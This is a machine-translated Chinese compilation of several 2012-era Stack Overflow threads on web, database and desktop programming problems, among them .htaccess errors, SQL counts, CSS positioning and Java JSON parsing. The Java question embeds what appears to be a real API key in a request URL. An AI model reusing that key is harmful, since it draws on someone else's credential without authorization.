我将我的项目粘贴回 www 目录，现在我得到了这个错误。我不要更改任何代码或其他东西。我刚刚格式化了我的电脑。.htaccess 工作我没有改变它。

我在本地主机上工作，我没有改变任何想法，我不知道为什么会发生。请帮助我，我必须解决它。

完整错误：

```
The server encountered an internal error or misconfiguration and was unable to complete your request.

Please contact the server administrator, admin@localhost and inform them of the time the error occurred, and anything you might have done that may have caused the error.

More information about this error may be available in the server error log. 
```

我的 .htaccess

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /blogna/index.php/$1 [L] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T03:41:38.560

使用它来检查 mod-rewrite 是否正常工作。如果它不起作用，您将获得 404 页面而不是内部服务器错误 500

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /blogna/index.php/$1 [L]
</IfModule>

<IfModule !mod_rewrite.c>
ErrorDocument 404 /index.php
</IfModule> 
```

IfModule 检查模块是否可用。你可以在这里找到关于 mod-rewrite 和 codeigniter 的 wiki 条目[http://codeigniter.com/wiki/mod_rewrite](http://codeigniter.com/wiki/mod_rewrite)

如果您看到 404 错误，则需要启用 mod-rewrite。如果您仍然看到 500 错误，则说明其他问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-21T14:26:14.957

我找到了解决方案，谢谢大家。

如果你想使用 htaccess，你必须在 wampserver 上启用它。

服务部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-10T16:15:29.190

```
DirectoryIndex index.php

RewriteEngine on
RewriteCond $1 !^(index\.php|images|css|js|robots\.txt|favicon\.ico)
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ ./index.php/$1 [L,QSA] 
```

# silverlight-4.0 - Visual Studio sp1 错误：RiaServices.msi 不可用

> ID：10239383
> 
> 赞同：4
> 
> 时间：2012-04-20T02:18:50.820
> 
> 标签：silverlight-4.0, wcf-ria-services, visual-studio-2010

我一直在尝试为 Visual Studio 2010 安装 sp1。我首先下载了 vm_web 和 Silverlight4_Tools，它们似乎都安装得很好。

我试图打开VS2010并得到错误，

此计算机上只有部分 Microsoft Visual Studio 2010 产品已升级到 Service Pack 1。在全部升级之前，任何产品都无法正常工作。

然后它会提示下载并安装 SP1。我下载了这个文件，运行了安装程序并解决了找到 silverlight_sdk.msi 文件的问题。

但是，我无法解决 RiaSerivices.msi 文件的问题。我已经在网上搜索过（显然是一个常见错误）并尝试过

1) 单独下载 RiaServices.msi 并指向下载文件夹中的文件。2）我还尝试将 RiaServices.msi 文件移动到安装文件夹（在我的情况下为 C:\Users\UserName\AppData\Local\Temp\Microsoft Visual Studio 2010 Service Pack 1_10.0.40219），正如另一个问题中所建议的那样

还是行不通。我得到的错误是，

文件“文件路径...”不是产品 WCF RIA Services V1.0 SP1 的有效安装包。尝试在可以安装 WCF RIA Services V1.0 SP1 的文件夹中找到安装包“RiaServices.msi”。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-31T02:26:12.020

尝试从[这里下载 Ria 服务](http://www.microsoft.com/en-us/download/details.aspx?id=14880)

设置将完成。

我也遇到了同样的问题，但是通过从这个位置下载 Ria 服务，问题得到了解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-30T15:51:29.447

面临同样的问题。我离开了这样的情况。我已经从磁盘 f 安装了 Microsoft Visual Studio 2010 Service Pack 1_10.0.40219，并询问安装程序 RiaServices.msi 是否存在于临时文件夹 C:\Users\user1\AppData\Local\Temp\Microsoft Visual Studio 2010 Service Pack 1_10 .0.40219。但我注意到磁盘是在临时文件夹中创建的。这就是我把他放在 RiaServices.msi 的地方。安装人员根据需要赚取。也许这会对某人有所帮助。从西南。码头

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-13T01:06:20.963

对于未来的 Google 员工：我遇到了同样的问题，但使用的是 vstor40_x64.msi。[这个 MS 修复程序](https://support.microsoft.com/en-us/mats/program_install_and_uninstall)为我解决了这个问题。我把头发拉了几天，所以我想为其他不幸被困在遗留系统的 VS2010 的人节省一些痛苦！

选择“我在安装程序时遇到问题”选项，然后选择它遇到的任何组件——在我的情况下是 VS 2010 Tools for Office Runtime，在你的情况下是 Ria Services。那么 SP1 应该会成功。您可能需要对其他部分安装的组件重复此操作。

# vb.net - Visual Basic - 从具有整数的数组中获取值

> ID：10239387
> 
> 赞同：0
> 
> 时间：2012-04-20T02:19:22.183
> 
> 标签：vb.net, arrays

我目前有一个数组...

将 mTeam(10) 调暗为字符串

在表单加载对于 Visual Basic 我有

```
 'Load Teams
    mTeam(1) = "Oklahoma"
    mTeam(2) = "USC"
    mTeam(3) = "LSU"
    mTeam(4) = "Michigan"
    mTeam(5) = "Georgia"
    mTeam(6) = "Texas"
    mTeam(7) = "Tennessee"
    mTeam(8) = "Ohio State"
    mTeam(9) = "Florida State"
    mTeam(10) = "Miami(FL)" 
```

现在我想做的是让用户在文本框中输入一个介于 1-10 之间的值，然后作为回报。将出现一个带有团队名称的消息框。

例子：

用户在 TextBoxNumber 中输入 5，当我点击按钮 ButtonName 时会出现一个消息框，并且在该消息框中它将包含单词“Georgia”。

* * *

TextBoxNumber（输入值的名称） ButtonName（完成所有工作并显示消息框的按钮）

任何帮助都会很好，我已经尝试过让它只取 1 到 10 之间的整数值。

请注意这是针对 VISUAL BASIC 的，我使用的是 MICROSOFT VISUAL STUDIO 2010

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T02:23:01.237

您可以尝试将用户的值转换为整数，如果成功则返回该索引处的数组值：

```
Dim ind As Integer = -1
If Integer.TryParse(TextBoxNumber.Text, ind) Then
    If ind >= 0 AndAlso ind < mTeam.Length
        MessageBox.Show(mTeam(ind).ToString())
    End If
End If 
```

# css - CSS 媒体查询高度

> ID：10239389
> 
> 赞同：2
> 
> 时间：2012-04-20T02:19:51.303
> 
> 标签：css, media

我刚刚学习了如何在用户调整窗口大小或具有不同的屏幕分辨率时使用 CSS 媒体查询使我的页面适合屏幕。

我的页面被设计成用户根本不需要滚动。我想让我的页面适合 1280 像素 x 768 像素和 1280 像素 x 960 像素的屏幕分辨率。问题是，当我有相似的宽度（1280 像素）时，页面会变得一团糟。

有人可以帮助我吗？非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-30T21:45:32.943

您可以在特定维度之间设置样式。例如，像这样：

```
@media(min-width:768px) and (max-width:979px){

<styles go here>

} 
```

然后，只要视口介于这两个维度之间，您的样式就会保持不变。

我刚刚意识到这篇文章有多老了，但我还是会继续添加它，希望它能帮助别人。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-19T10:46:02.303

使用逗号指定两个（或多个）不同的规则：

```
@media screen and (max-width: 995px) , screen and (max-height: 700px) {
   ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T05:47:51.127

您可能想查看[http://css-tricks.com/resolution-specific-stylesheets/](http://css-tricks.com/resolution-specific-stylesheets/)

它是关于如何为不同分辨率创建多个样式表的优秀指南。

# mysql - 从一个表中选择count（id），其中该id存在于另一个表MYSQL中

> ID：10239390
> 
> 赞同：3
> 
> 时间：2012-04-20T02:20:03.263
> 
> 标签：mysql

**编辑：详细说明**

***详细说明：***

*在 table_a 中有 100 个成员，但其中只有 50 个成员在 table_b 中有记录，只有 25 个在 table_b 中有记录，其中批准 = 1 因此查询返回的值是 25*

嘿，这里的每个人都是我要解决的查询，它需要返回一个结果计数，以便我可以使用 mysql_result($query, 0) 访问。

```
SELECT COUNT(id) FROM table_a WHERE (THIS IS WHERE I AM STUCK) 
```

我需要检查（table_b 中的 memberID 计数与 table_a 中的每个 id 匹配并在 table_b = 1 中批准的成员 ID） - 是否大于 1

最终结果需要计算在 table_b 中有条目的成员数。

需要访问的表列示例

```
table_a
-----------------
id

table_b
------------------
id
memberID
approved 
```

如果您需要更多详细信息，请告诉我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T20:27:24.037

**问题解决了**

不得不倒过来想

```
 SELECT COUNT( DISTINCT memberID )
    FROM table_b
    WHERE approved =1 
```

我什至不需要查看 table_a，因为我正在根据 table_b 计算 memberID

有时解决方案是如此简单，就在您面前。

感谢所有的帮助！我希望这对将来的其他人有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T02:27:48.880

我假设您想要获取 table_a 中与 table_b 匹配的记录数，只要 table_b 中的值被批准。因此，我将加入 2 张桌子。内连接确保您只考虑两个表中的行，并且 where 语句处理批准的要求。

```
select count(a.id) 
from table_a a
join table_b b
on a.id = b.memberID
where b.approved=1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T02:26:55.980

```
 SELECT b.ID, a.ID 

 FROM table_a a, table_b b 

 WHERE a.ID = b.ID AND b.ID = 1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T02:35:54.680

我对 SQL 有点生疏，但可以通过在查询中指定两个表来实现，如下所示：

```
SELECT COUNT(DISTINCT table_a.id) 
  FROM table_a, table_b 
  WHERE table_a.id = table_b.MemberID 
    AND table_b.approved = 1; 
```

我相信这符合您的选择标准。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T20:25:56.263

```
SELECT COUNT(*) AS cnt
FROM table_a AS a
WHERE EXISTS
      ( SELECT *
        FROM table_b AS b
        WHERE b.memberID = a.id
          AND b.approved = 1
      ) 
```

# css - 职位问题：绝对；

> ID：10239391
> 
> 赞同：0
> 
> 时间：2012-04-20T02:20:07.087
> 
> 标签：css, position, css-position

所以这就是正在发生的事情，如下图所示 浏览器的屏幕尺寸正在让女人遮住东西或移动，就像我所说的那样。

这是我的代码

```
img#woman{
    position:absolute;
    bottom:100px;
    display:block;
    right:55%;
    z-index: 900;
}
#homearea{
    display:block;
    height:750px;
} 
```

[http://i.imgur.com/3A19L.jpg](https://i.imgur.com/3A19L.jpg)![屏幕上的女人](../Images/a3685367a5873df46064f57959e6b70e.png)

我需要女人呆在一个地方，她应该看起来像这样

![她应该是什么样子](../Images/c977b9a766af46de1bff7a7945c543af.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:28:31.977

这是没有看到您的 HTML：

尝试将包含 div (#homearea?) 上的位置设置为相对，然后将图像的方向值更改为相对于包含 div 的左上角。

换句话说，尝试这样的事情：

```
img#woman{
    position:absolute;
    top:200px;
    display:block;
    left:-30px;
    z-index: 900;
}
#homearea{
    position:relative;
    display:block;
    height:750px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T05:15:37.397

嗨，我想你可能是你在背景中使用了这些图像，就像这样

根据您的布局定义您的 Homearea id 位置相对和女人 id 给出绝对位置并给出背景图像并设置为左上角底部

像这样

**CSS**

```
#homearea{
 position:relative;

}

#woman{
width:xxx; // width of your images
height:xx; // height of your images
    position:absolute;
    bottom:100px;
    right:55%;
    z-index: 900;
background:url('../../xxx.jpg') no-repeat 0 0;
} 
```

**HTML**

```
 <div id="homearea">
    <div id="woman"></div>
    </div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T07:18:09.757

我认为你应该定义**position:relative;** 到您的**父 div**和**位置：绝对；**给你的**孩子部**希望这会奏效......

```
 img#woman{
    position:absolute;
    bottom:100px;
    display:block;
    right:55%;
    z-index: 900;
}
#homearea{
    height:750px;
    position:relative; 
} 
```

# c# - C# 组合框选项依赖于另一个组合框

> ID：10239392
> 
> 赞同：-1
> 
> 时间：2012-04-20T02:20:13.533
> 
> 标签：c#, combobox

我正在开发一个程序，其中组合框的选项依赖于另一个组合框的选定选项。第一个组合框中的选定项目选择第二个组合框中的选项。有谁知道如何做到这一点？

这是将信息添加到第一个组合框的按钮

```
 try
        {
            CustomerAccount aCustomerAccount = new CustomerAccount(txtAccountNumber.Text, txtCustomerName.Text,
            txtCustomerAddress.Text, txtPhoneNumber.Text);
            account.Add(aCustomerAccount);

            cboClients.Items.Add(aCustomerAccount.GetCustomerName());
            ClearText();
        }
        catch (Exception)
        {
            MessageBox.Show("Make sure every text box is filled in!", "Error", MessageBoxButtons.OK);
        } 
```

这是第一个组合框的 selectedIndex。

```
 private void cboClients_SelectedIndexChanged(object sender, EventArgs e)
    {

        CustomerAccount custAccount = account[cboClients.SelectedIndex] as CustomerAccount;
        if (custAccount != null)
        {
            txtAccountNumberTab2.Text = custAccount.GetAccountNumber();
            txtCustomerNameTab2.Text = custAccount.GetCustomerName();
            txtCustomerAddressTab2.Text = custAccount.GetCustomerAddress();
            txtCustomerPhoneNumberTab2.Text = custAccount.GetCustomerPhoneNo();
        }
    } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T02:30:20.393

为`SelectedIndexChanged`第一个`ComboBox`. 使用它来清除第二个的内容`ComboBox`并用相关项目填充它：

```
public Form1()
  {
    InitializeComponent();
    for(int i = 0; i < 10; i++) {
        comboBox1.Items.Add(String.Format("Item {0}", i.ToString()));
    }
    comboBox1.SelectedIndex = 0;
  }

private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
  {
    comboBox2.Items.Clear();
    for (int i = 0; i < 5; i++)
    {
      comboBox2.Items.Add(String.Format("Item_{0}_{1}", 
                          comboBox1.SelectedItem, i.ToString()));
    }
    comboBox2.SelectedIndex = 0;
  } 
```

# php - PHP'跳动'javascript函数调用？

> ID：10239395
> 
> 赞同：1
> 
> 时间：2012-04-20T02:21:36.103
> 
> 标签：php, javascript

我有一个奇怪的问题。

我正在创建一个基于位置的网络应用程序，它使用 javascript 函数来获取用户的 GPS 坐标。我有一个带有提交按钮的表单，当单击该提交按钮时，该函数被调用（onclick='getCoords()"）。然后，javascript 将两个隐藏字段（纬度和经度）的值设置为 GPS 坐标.

我的问题是：PHP 正在“击败”javascript，因为没有及时设置字段值，因此每个值都变为 0。我已经做了一堆测试，这绝对是问题所在. 如果我设置一个单独的按钮来运行 javascript 函数，则运行表单一切正常。

关于如何解决这个问题的任何想法？

要点：

[https://gist.github.com/2425419](https://gist.github.com/2425419)

[https://gist.github.com/2425394](https://gist.github.com/2425394)

[https://gist.github.com/2425391](https://gist.github.com/2425391)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:43:39.777

按照 Volkner 所说的，使用提交处理程序（调用`preventDefault`）阻止提交，然后在`itsWorking`. 您可以调用`.submit()`提交，也可以使用 AJAX。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T02:58:21.987

我认为您的问题的症结在于，`<input type="image">`将提交一份表格，就像`<input type="submit">`会一样。

但是，要按原样解决此问题，请将`event`其作为参数添加到`getUserLocation(event)`.

然后按如下方式编辑您的 JavaScript：

```
function getUserLocation(event) {
    event.preventDefault(); // prevents form from submitting
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(itsWorking, notWorking);
    } 
    else {
        alert("Dang! Your browser doesn't support finding your location, use the zipcode method below.");
    }
};

function itsWorking(position) {
    var lat = position.coords.latitude;
    var longi = position.coords.longitude;
    var finalLat = Math.round(lat*1000000)/1000000
    var finalLong = Math.round(longi*1000000)/1000000
    $("#longi").val(finalLong);
    $("#lati").val(finalLat);

    document.getElementById('findoneform').submit(); // submits form since we were successful
}; 
```

但就像我最初所说的那样，如果您使用`img`标签而不是，这似乎`<input type="image">`会阻止表单首先发送（也许您是故意这样做的，因为您希望有两种提交表单的方法？）。

发生这个问题是因为页面在地理定位器完成它的事情之前卸载（提交表单），但是这样，我们停止提交表单，并且`itsWorking()`只有在地理定位器完成它的事情之后才被调用，所以我们不提交形成，直到`itsWorking()`我们完成了我们想做的一切。

# html - 您可以使用 Stylus、Jade 和 Coffeescript 与 Trigger.io 等原生移动包装器一起进行开发吗？

> ID：10239397
> 
> 赞同：2
> 
> 时间：2012-04-20T02:21:53.503
> 
> 标签：html, css, coffeescript, trigger.io, forge

我很高兴开始我的第一个项目，只是想知道您是否对使用 Stylus、Jade 和 Coffeescript 进行开发的最佳方式有任何经验或建议？

我确定我可以解决一些问题，但我想看看是否有推荐/最快的方法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T19:39:09.730

是的。Trigger.io 用户使用这些技术修改了基本模板应用程序，您可以[在 Github 上查看代码](https://github.com/mhuebert/Forge-Bootstrap)。

更一般地，您可以向 Trigger.io 构建过程添加自定义步骤，例如使用 hooks 进行咖啡脚本编译。文档在这里：[http ://docs.trigger.io/en/latest/tools/hooks.html](http://docs.trigger.io/en/latest/tools/hooks.html)

# qunit - 流星与 QUnit

> ID：10239399
> 
> 赞同：5
> 
> 时间：2012-04-20T02:22:04.650
> 
> 标签：qunit, meteor

我正在尝试将 QUnit 与 Meteor 应用程序一起使用。这应该可能吗？有什么推荐的款式吗？

我试图通过为“/test”创建路由来制作一个“自我测试”的应用程序，但 QUnit 似乎没有运行我的测试（没有出现测试输出）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-14T03:00:19.770

@Tom，当然可以：

我在这里添加了一个带有流星的 qunit 包：

[https://github.com/jpmec/meteor/commit/786b93153d94c0e2291ac210f64587dbbbad23d6](https://github.com/jpmec/meteor/commit/786b93153d94c0e2291ac210f64587dbbbad23d6)

一些事实和免责声明：

*   我没有转到正确的分支，我从 master 分支而不是 devel。
*   我没有花太多时间试图让我的流星分支保持最新。
*   这个流星分支确实是主要的流星项目，所以不要从它分支。

最好的办法是下载并查看 qunit 的包文件夹。那部分我认为我做对了。你可能只想把它放在你的流星包文件夹中，看看它是否对你有帮助。

在尝试了一些之后，这是我对其他可能使用流星用户的 qunit 的想法：

*   我无法弄清楚如何使用流星轻松拥有“测试站点”和“生产站点”。似乎它是开箱即用的全部或全部，因此您可以拥有一个自测试站点，但所有用户都可以运行测试。（我想要的是在一个端口上提供一个站点，在另一个端口上提供另一个站点，同时为我的“应用程序”保持一致的文件夹树）。

*   流星的热推用 qunit 真的很酷。当您编写测试时，您会看到它们半实时地从红色变为绿色。无需不断切换到测试页面并刷新。这是迄今为止流星最酷的部分，并使用 qunit 和流星。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-16T18:45:06.837

这个问题的答案对我来说有点复杂。

我发现将 qunit 放在一个包中与仅在我的 /client 文件中包含 qunit 源之间没有明显的区别。我的困难是有时测试似乎运行，有时根本没有运行，而且我的测试结果中经常会出现一个神秘的“全局错误”。

这是由 qunit 调用的，它试图在我自己的代码加载测试之前自动启动测试运行。我发现没有很好的解决方案来防止自动行为。我最终的解决方案是让 qunit 完成它的（空的）自动测试运行，然后调用 Qunit.init()、负载测试，然后是 Qunit.start()。

# android - 如何在 Android 1.x 到 4.x 上以编程方式创建文件夹

> ID：10239401
> 
> 赞同：4
> 
> 时间：2012-04-20T02:22:17.897
> 
> 标签：android, directory

我想从我的应用程序在主屏幕上创建一堆文件夹，其中包含应用程序和快捷方式。我还需要不时更改这些文件夹，在其中添加和删除项目。

Android 1.x 和 2.x 曾经有已弃用的实时文件夹。Honeycomb 有 App Widgets Collections。我相信 Android 4.x 有一种新型的文件夹。

我应该使用哪个 API 来兼容所有版本的 Android？

我注意到有多少其他应用程序使用看起来像文件夹的小部件，但将它们添加到主屏幕是一件痛苦的事情，而且它们不是标准的。

# c# - 在后面的 asp.net 代码中读取编码的 url

> ID：10239410
> 
> 赞同：1
> 
> 时间：2012-04-20T02:24:13.073
> 
> 标签：c#, javascript, asp.net, urlencode

我从这里使用这个编码/解码 javascript 64bit [http://www.webtoolkit.info/javascript-base64.html](http://www.webtoolkit.info/javascript-base64.html)

所以这里是scanrio：我正在从JavaScript 重定向到一个新的aspx 页面，并且在page_load 上我正在读取QueryString id。

一切正常，但问题是，如果我想在代码隐藏的 asp.net 中编码/解码，我该怎么办？

我打算在从 .JS 重定向到页面之前进行编码，但是我将如何读取后面的 asp.net 代码中的编码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T04:31:27.217

> 一切正常，但问题是，如果我想在代码隐藏的 asp.net 中编码/解码，我该怎么办？

在后面的代码中使用以下方法进行编码和解码。

```
static public string DecodeFrom64(string encodedData)
{
    byte[] encodedDataAsBytes
        = System.Convert.FromBase64String(encodedData);
    string returnValue =
        System.Text.ASCIIEncoding.ASCII.GetString(encodedDataAsBytes);
    return returnValue;
}

static public string EncodeTo64(string toEncode)
{
    byte[] toEncodeAsBytes
            = System.Text.ASCIIEncoding.ASCII.GetBytes(toEncode);
    string returnValue
            = System.Convert.ToBase64String(toEncodeAsBytes);
    return returnValue;
} 
```

> 我打算在从 .JS 重定向到页面之前进行编码，但是我将如何读取后面的 asp.net 代码中的编码？

您可以调用`DecodeFrom64`方法来使用 JS 解码编码的文本。

**测试 ：**

```
 input = "Abu Hamzah"
 JS encoded text = "QWJ1IEhhbXphaA==" 
```

`DecodeFrom64("QWJ1IEhhbXphaA==")`结果是`"Abu Hamzah"`，`EncodeTo64("Abu Hamzah")`结果`"QWJ1IEhhbXphaA=="`如预期。

## **编辑：**

添加base64编码解码java脚本

```
<script type="text/javascript" src="/js/webtoolkit.base64.js"> 
```

你可以从这里下载它[http://www.webtoolkit.info/djs/webtoolkit.base64.js](http://www.webtoolkit.info/djs/webtoolkit.base64.js)

在您的 javascript 中，您可以如下调用此方法

```
window.location.href="mypage.aspx?id=" + Base64.encode('Test'); 
```

如果你想从服务器端解码这个查询字符串参数，那么你可以使用`DecodeFrom64`方法

# php - 从 PHP 中的会话数组中打印值

> ID：10239413
> 
> 赞同：2
> 
> 时间：2012-04-20T02:25:14.213
> 
> 标签：php, arrays, session, printing

我正在尝试打印存储在会话变量数组中的值列表，而我得到的只是“标头已发送...”错误。在错误页面上，我可以看到阵列工作，但显然它不会从那里继续。错误提到的行是这样的：

```
$uploadedfiles = print_r($_SESSION['uploadedfiles']); 
```

声明数组并将值添加到其中：

```
array_push($_SESSION['uploadedfiles'], $file_name); 
```

有什么想法吗？

非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T02:26:40.937

`print_r()`会自动打印到屏幕上。您需要将第二个参数设置`true`为实际将其捕获到变量中。

```
$uploadedfiles = print_r($_SESSION['uploadedfiles'], true); 
```

# java - JAVA JSONObject 解析问题

> ID：10239414
> 
> 赞同：0
> 
> 时间：2012-04-20T02:25:20.437
> 
> 标签：java, json

我正在使用`JSONObject`从 API 示例中解析嵌套的 JSON：

```
 {"results":[{"congress":"112","state":"NJ","num_results":"2","offset":"0","members": [{"id":"L000123","first_name":"Frank".......................... 
```

我无法使用`JSONObject`.
这是我的代码，有什么想法吗？

```
url= new  URL("http://api.nytimes.com/svc/politics/v3/us/legislative/congress/112/senate/members.json?&state=NJ&api-key=7967107ef3c9e8d6c2f560027f87904e:17:65990356");                

            ByteArrayOutputStream urlOutputStream = new ByteArrayOutputStream();
            IOUtils.copy(url.openStream(), urlOutputStream);
            String urlContents = urlOutputStream.toString();

            // parse the JSON object returned
            JSONObject jsonO = new JSONObject(urlContents);
            System.out.println(jsonO.toString());
            JSONObject results =  jsonO.getJSONObject("results");
            JSONObject  senators = results.getJSONObject("members"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T15:35:02.370

您应该使用 GSON 等第三方库。

[http://code.google.com/p/google-gson/](http://code.google.com/p/google-gson/)

# sql-server - 从 SQL 作业代理访问另一个 SQL Server

> ID：10239422
> 
> 赞同：0
> 
> 时间：2012-04-20T02:26:13.577
> 
> 标签：sql-server, database, sql-server-2008, sql-server-agent

我在“服务器 X”上有一个 SQL Server 代理作业。这项工作很简单，并使用以下查询通过清除表来刷新表（在服务器 X 上），然后用视图中的数据（也在服务器 X 上）重新填充它：

```
DELETE FROM [ClientList].[dbo].[LatestDownloadLogs]

INSERT INTO [ClientList].[dbo].[LatestDownloadLogs] 
SELECT * FROM [ClientList].[dbo].[latestoverview-union] 
```

“LatestDownloadLogs”表正在移动到“服务器 Y”，但“latestoverview-union”视图将保留在“服务器 X”上。

因此，我需要的是看起来像这样的东西：

```
DELETE FROM [server Y].[ClientList].[dbo].[LatestDownloadLogs]

INSERT INTO [server Y].[ClientList].[dbo].[LatestDownloadLogs] 
SELECT * FROM [server X].[ClientList].[dbo].[latestoverview-union] 
```

当然，这并不容易，但希望这能说明我正在努力实现的目标。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T05:29:05.893

在服务器 x 上创建到服务器 y 的链接服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:31:37.933

您可以使用 OPENROWSET，它需要连接信息、用户名和密码...

但首先您可能需要打开 Ad Hoc Distributed Queries

```
EXEC sp_configure 'show advanced options', 1  
reconfigure  

EXEC sp_configure 'Ad Hoc Distributed Queries', 1  
reconfigure 
```

然后您可以选择、插入或删除

```
SELECT FROM
OPENROWSET (... params...)

UPDATE
OPENROWSET (... params...) 
```

希望这有帮助，祝你好运。

# javascript - IE 9 兼容视图导致脚本无法加载

> ID：10239423
> 
> 赞同：0
> 
> 时间：2012-04-20T02:26:19.257
> 
> 标签：javascript, jquery, internet-explorer, nivo-slider

我正在使用 jQuery，代码加载正常，当我改变 CSS 时，现在给了我一个非法的 jQuery 操作句柄。现在不会在兼容模式下加载。

```
SCRIPT1028: Expected identifier, string or number 
index.php, line 124 character 1 
```

我从脚本调试中收到。我没有收到这是任何其他浏览器。

我的 jQuery 是：

```
<script type="text/javascript" src="lib/js/jquery-1.7.2.min.js"></script>
<script type="text/javascript" src="lib/js/jquery.nivo.slider.pack.js"></script>
<script type="text/javascript">
$(window).load(function() {
$('#slider').nivoSlider({
    effect: 'fade', // Specify sets like: 'fold,fade,sliceDown'
    animSpeed: 500, // Slide transition speed
    pauseTime: 5000, // How long each slide will show
    startSlide: 0, // Set starting Slide (0 index)
});
});
</script> 
```

有人能告诉我哪里出错了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:34:08.567

删除此行的尾随逗号：

```
startSlide: 0, 
```

应该：

```
startSlide: 0 
```

旧版本的 Internet Explorer 不支持对象表示法中的尾随逗号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T02:34:55.727

去掉startSlide后面的逗号：0

```
$(window).load(function() {
$('#slider').nivoSlider({
    effect: 'fade', // Specify sets like: 'fold,fade,sliceDown'
    animSpeed: 500, // Slide transition speed
    pauseTime: 5000, // How long each slide will show
    startSlide: 0 // Remove the comma here
});
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T02:34:43.323

您是否有机会从页面中删除了容器？

```
<div id="slider"></div> 
```

# java - 在 Java 中创建矩形时，我是否真的调用了我创建的 paintComponent 方法？

> ID：10239430
> 
> 赞同：3
> 
> 时间：2012-04-20T02:27:21.533
> 
> 标签：java, swing, jframe, jpanel, jcomponent

这是我当前的 RectangleComponent 类，我将它添加到我的主 JFrame 的面板中，但它从未出现。我以为不是画图所以决定在Rectangle的构造函数中调用paintComponent方法，经过4-5个nullPointerExceptions排序后，什么都没有改变。我已经阅读了多篇关于如何绘制矩形的指南，也看过多个代码示例，但我永远无法让面板与多个 JComponent 一起使用。如果可以，请简要查看我的代码，看看是否可以设计解决方案。感谢您的时间。还列出了我在其中调用矩形构造函数的框架。

```
public class GameFrame extends JFrame
{
    private SpellBarComponent bar;
    private JPanel mainPanel = new JPanel();
    private JPanel buttonPanel = new JPanel();
    private JPanel healthPanel = new JPanel();
    Color green = new Color(29, 180, 29);
    Color red = new Color(255, 0, 0);
    private RectangleComponent life;
    private RectangleComponent death;
    private JFrame frame = new JFrame();

    public GameFrame(char x)
    {
        frame.setSize(1024, 768);
        frame.setTitle("Game");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);
        FlowLayout layout = new FlowLayout();
        createPanels(x);
        healthPanel.setLayout(layout);
        buttonPanel.setLayout(layout);
        mainPanel.setLayout(layout);
        frame.getContentPane().add(mainPanel);
        frame.pack();
        repaint();
    }

    public RectangleComponent getLife()
    {
        return life;
    }

    private void createHealth()
    {
        life = new RectangleComponent(green, healthPanel);
        death = new RectangleComponent(red, healthPanel);
    }

    private void createPanels(char x)
    {
        add(healthPanel);
        pack();
        createBar(x);
        createHealth();
        mainPanel.add(buttonPanel);
        mainPanel.add(healthPanel);
        healthPanel.add(death);
        healthPanel.add(life);
        buttonPanel.add(bar.getSpell1());
        buttonPanel.add(bar.getSpell2());
        buttonPanel.add(bar.getSpell3());
        add(mainPanel);
    }

    private void createBar(char x)
    {
        bar = new SpellBarComponent(x, mainPanel);
    }
}

public class RectangleComponent extends JComponent
{
    Color color;
    int width;
    int height = 18;
    RoundRectangle2D roundedRectangle;
    private JPanel panel;
    public RectangleComponent(Color color, JPanel panel)
    {
        this.panel = panel;
        this.color = color;
        paintComponent(panel.getGraphics());
    }

    public void paintComponent(Graphics g)
    {
        Graphics2D graphics2 = (Graphics2D) g;
        width = 125;
        roundedRectangle = new RoundRectangle2D.Float(10, 10, width, height, 10, 10);
        graphics2.setPaint(color);
        graphics2.fill(roundedRectangle);
        graphics2.draw(roundedRectangle); 
    }

    public void subtractLife(int amount)
    {
        width -= amount;
        roundedRectangle.setRoundRect(10, 10, width, height, 10, 10);
        repaint();
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T07:36:16.767

为了让您的 Swing 应用程序按预期工作，您需要牢记许多事情。由于您以错误的方式编码，因此总是必须遵循某些步骤才能避免可能出现的某些障碍。为此，请坚持 Swing Programming Strictly 的基础知识，并遵循它们。

